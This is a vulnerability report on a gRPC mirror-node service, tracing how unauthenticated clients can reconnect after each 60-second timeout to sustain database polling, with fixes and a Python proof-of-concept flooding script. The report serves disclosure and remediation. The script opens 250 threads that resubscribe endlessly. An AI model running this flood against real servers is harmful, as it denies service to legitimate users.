### Title
Unauthenticated Subscription Reconnect Loop Enables Unbounded Database Polling Amplification

### Summary
`PollingTopicMessageRetriever.retrieve()` applies a 60-second timeout per subscription instance, but this timer resets completely on every new subscription. Because the gRPC server enforces no per-client IP connection rate limit, no global subscriber cap, and no reconnection cooldown, any unauthenticated external user can open arbitrarily many connections and immediately reconnect after each timeout, sustaining continuous database polling pressure indefinitely.

### Finding Description
**Exact code path:**

- `grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java`, `retrieve()`, line 59:
  ```java
  .timeout(retrieverProperties.getTimeout(), scheduler)
  ```
  `retrieverProperties.getTimeout()` defaults to `Duration.ofSeconds(60L)` (`RetrieverProperties.java` line 28). This timeout is scoped to the `Flux` returned by a single `retrieve()` call. When it fires, the subscription terminates with a `TimeoutException` — but the server has no memory of the client.

- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, line 33:
  ```java
  serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
  ```
  `NettyProperties.maxConcurrentCallsPerConnection` defaults to `5`. This is the **only** server-level connection constraint configured. There is no `maxConnections()`, no per-IP limit, and no global subscriber cap enforced anywhere in the gRPC module.

- `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 48 and 89–90:
  ```java
  private final AtomicLong subscriberCount = new AtomicLong(0L);
  // ...
  .doOnSubscribe(s -> subscriberCount.incrementAndGet())
  .doFinally(s -> subscriberCount.decrementAndGet())
  ```
  `subscriberCount` is wired only to a Micrometer `Gauge` metric (line 52–55). It is never checked against any maximum; it is purely observational.

**Root cause:** The design assumes the 60-second timeout is a sufficient resource bound per subscriber. The failed assumption is that clients will not immediately reconnect. Because there is no reconnection rate limit, no IP-level connection cap, and no global subscriber ceiling, the timeout provides no sustained protection — it merely introduces a 60-second window per connection slot, after which the attacker reclaims a fresh slot.

**Exploit flow:**
1. Attacker opens *K* TCP connections to the gRPC port (no server-side connection limit).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` calls (the per-connection maximum).
3. Each subscription triggers `PollingTopicMessageRetriever.retrieve()` with `throttled=true`, which polls `topicMessageRepository.findByFilter()` every 2 seconds (`pollingFrequency = Duration.ofSeconds(2L)`).
4. After 60 seconds the timeout fires; the attacker immediately dials a new subscription (or reuses the freed slot).
5. Net effect: *K × 5* concurrent DB queries every 2 seconds, sustained indefinitely, with zero authentication required.

### Impact Explanation
Each `findByFilter` call executes a full JPA/Hibernate query against the `topic_message` table with an index scan. Under sustained load from many concurrent subscriptions, the database connection pool is exhausted, query latency rises for all users, and legitimate subscribers are starved. Because the gRPC service is the primary real-time data path for HCS topic consumers, a successful amplification attack degrades or denies service to all downstream clients. Severity is **High** (availability impact, no authentication required, no resource cost to attacker).

### Likelihood Explanation
The attack requires only a standard gRPC client library and knowledge of any valid topic ID (topic IDs are public on-chain). No credentials, tokens, or privileged access are needed. The reconnect loop can be scripted in under 20 lines of code. The attacker bears negligible cost (a few open TCP sockets) while imposing O(K) database load on the server. The attack is repeatable, automatable, and leaves no persistent state to clean up.

### Recommendation
1. **Enforce a global subscriber ceiling**: Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` when exceeded.
2. **Add per-IP connection rate limiting**: Configure `NettyServerBuilder` with `maxConnectionsPerIp` or use a gRPC interceptor to track and cap concurrent streams per remote address.
3. **Introduce a reconnection cooldown**: Track the last subscription time per client identity (IP or token) and reject new subscriptions that arrive within a configurable window after a timeout.
4. **Apply infrastructure-level rate limiting**: Add a gRPC-aware rate-limiting middleware (e.g., Envoy's `ratelimit` filter or Traefik's `InFlightReq` middleware) in front of the service to cap new stream creation per IP per second.

### Proof of Concept
```python
import grpc
import threading
from com_hedera_mirror_api.proto import consensus_service_pb2_grpc, mirror_network_service_pb2

GRPC_HOST = "mirror-node:5600"
TOPIC_ID = "0.0.12345"  # any valid topic

def flood_subscribe():
    while True:
        try:
            channel = grpc.insecure_channel(GRPC_HOST)
            stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
            req = mirror_network_service_pb2.ConsensusTopicQuery(
                topicID=...,  # set TOPIC_ID
                consensusStartTime=...,  # set to epoch
            )
            # Each call polls DB every 2s for 60s, then times out
            for _ in stub.subscribeTopic(req):
                pass
        except Exception:
            pass  # reconnect immediately on timeout

# Open 50 connections × 5 concurrent calls = 250 simultaneous DB polling streams
threads = [threading.Thread(target=flood_subscribe) for _ in range(250)]
for t in threads:
    t.start()
# Result: 250 DB queries every 2 seconds, sustained indefinitely, no auth required

    @Override
    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
